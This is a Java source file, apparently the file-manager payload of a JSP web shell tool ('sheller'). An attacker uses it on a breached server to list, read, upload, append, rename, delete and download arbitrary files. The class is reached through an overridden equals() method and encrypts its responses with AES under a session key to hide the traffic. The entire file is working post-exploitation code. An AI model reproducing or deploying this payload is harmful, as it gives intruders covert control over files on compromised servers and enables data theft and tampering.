package vip.youwe.sheller.payload.java;

import sun.misc.BASE64Decoder;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.io.*;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.*;

public class FileOperation {

    public static String mode;
    public static String path;
    public static String newPath;
    public static String content;
    public static String charset;
    private ServletRequest Request;
    private ServletResponse Response;
    private HttpSession Session;
    private Charset osCharset = Charset.forName(System.getProperty("sun.jnu.encoding"));


    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();
        this.Request = page.getRequest();

        this.Response.setCharacterEncoding("UTF-8");
        Map<String, String> result = new HashMap<String, String>();
        try {
            if (mode.equalsIgnoreCase("list")) {
                result.put("msg", list(page));
                result.put("status", "success");
            } else if (mode.equalsIgnoreCase("show")) {
                result.put("msg", show(page));
                result.put("status", "success");
            } else if (mode.equalsIgnoreCase("delete")) {
                result = delete(page);
            } else if (mode.equalsIgnoreCase("create")) {
                result.put("msg", create(page));
                result.put("status", "success");
            } else if (mode.equalsIgnoreCase("append")) {
                result.put("msg", append(page));
                result.put("status", "success");
            } else {
                if (mode.equalsIgnoreCase("download")) {
                    download(page);
                    return true;
                }
                if (mode.equalsIgnoreCase("rename")) {
                    result = renameFile(page);
                } else if (mode.equalsIgnoreCase("createFile")) {
                    result.put("msg", createFile(page));
                    result.put("status", "success");
                } else if (mode.equalsIgnoreCase("createDirectory")) {
                    result.put("msg", createDirectory(page));
                    result.put("status", "success");
                }
            }
        } catch (Exception e) {
            result.put("msg", e.getMessage());
            result.put("status", "fail");
        }
        try {
            ServletOutputStream so = this.Response.getOutputStream();
            so.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception e) {

            e.printStackTrace();
        }
        return true;
    }

    private String list(PageContext page) throws Exception {
        String result = "";
        File f = new File(path);
        List<Map<String, String>> objArr = new ArrayList<Map<String, String>>();
        if (f.isDirectory()) {
            for (File temp : f.listFiles()) {
                Map<String, String> obj = new HashMap<String, String>();
                obj.put("type", temp.isDirectory() ? "directory" : "file");
                obj.put("name", temp.getName());
                obj.put("size", temp.length() + "");
                obj.put("perm", temp.canRead() + "," + temp.canWrite() + "," + temp.canExecute());
                obj.put("lastModified", (new SimpleDateFormat("yyyy/MM/dd HH:mm:ss")).format(new Date(temp.lastModified())));
                objArr.add(obj);
            }
        } else {
            Map<String, String> obj = new HashMap<String, String>();
            obj.put("type", f.isDirectory() ? "directory" : "file");
            obj.put("name", new String(f.getName().getBytes(this.osCharset), "GBK"));
            obj.put("size", f.length() + "");
            obj.put("lastModified", (new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")).format(new Date(f.lastModified())));
            objArr.add(obj);
        }
        return buildJsonArray(objArr, true);
    }


    private String show(PageContext page) throws Exception {
        if (charset == null)
            charset = System.getProperty("file.encoding");
        StringBuffer sb = new StringBuffer();
        File f = new File(path);
        if (f.exists() && f.isFile()) {
            InputStreamReader isr = new InputStreamReader(new FileInputStream(f), charset);
            BufferedReader br = new BufferedReader(isr);

            String str = null;
            while ((str = br.readLine()) != null) {
                sb.append(str + "\n");
            }
            br.close();
            isr.close();
        }
        return sb.toString();
    }

    private String create(PageContext page) throws Exception {
        String result = "";
        FileOutputStream fso = new FileOutputStream(path);
        fso.write((new BASE64Decoder()).decodeBuffer(content));
        fso.flush();
        fso.close();
        return path + "上传完成，远程文件大小:" + (new File(path)).length();
    }


    private Map<String, String> renameFile(PageContext page) throws Exception {
        Map<String, String> result = new HashMap<String, String>();
        File oldFile = new File(path);
        File newFile = new File(newPath);
        if (oldFile.exists() && oldFile.isFile() & oldFile.renameTo(newFile)) {
            result.put("status", "success");
            result.put("msg", "重命名完成:" + newPath);
        } else {
            result.put("status", "fail");
            result.put("msg", "重命名失败:" + newPath);
        }

        return result;
    }

    private String createFile(PageContext page) throws Exception {
        String result = "";
        FileOutputStream fso = new FileOutputStream(path);
        fso.close();
        return path + "创建完成";
    }


    private String createDirectory(PageContext page) throws Exception {
        String result = "";
        File dir = new File(path);
        dir.mkdirs();
        return path + "创建完成";
    }


    private void download(PageContext page) throws Exception {
        FileInputStream fis = new FileInputStream(path);
        byte[] buffer = new byte[1024000];
        int length = 0;
        ServletOutputStream sos = page.getResponse().getOutputStream();
        while ((length = fis.read(buffer)) > 0) {
            sos.write(Arrays.copyOfRange(buffer, 0, length));
        }
        sos.flush();
        sos.close();
        fis.close();
    }

    private String append(PageContext page) throws Exception {
        String result = "";
        FileOutputStream fso = new FileOutputStream(path, true);
        fso.write((new BASE64Decoder()).decodeBuffer(content));
        fso.flush();
        fso.close();
        return path + "追加完成，远程文件大小:" + (new File(path)).length();
    }


    private Map<String, String> delete(PageContext page) throws Exception {
        Map<String, String> result = new HashMap<String, String>();
        File f = new File(path);
        if (f.exists()) {
            if (f.delete()) {
                result.put("status", "success");
                result.put("msg", path + " 删除成功.");
            } else {
                result.put("status", "fail");
                result.put("msg", "文件" + path + "存在，但是删除失败.");
            }
        } else {
            result.put("status", "fail");
            result.put("msg", "文件不存在");
        }
        return result;
    }


    private String buildJsonArray(List<Map<String, String>> list, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        sb.append("[");
        for (Map<String, String> entity : list) {
            sb.append(buildJson(entity, encode) + ",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1);
        sb.append("]");
        return sb.toString();
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key);
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});
                } else {
                    this.getClass();
                    Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = Base64.newInstance();
                    value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{value.getBytes("UTF-8")});

                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }


    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getAttribute("u").toString();
        byte[] raw = key.getBytes("utf-8");
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }
}
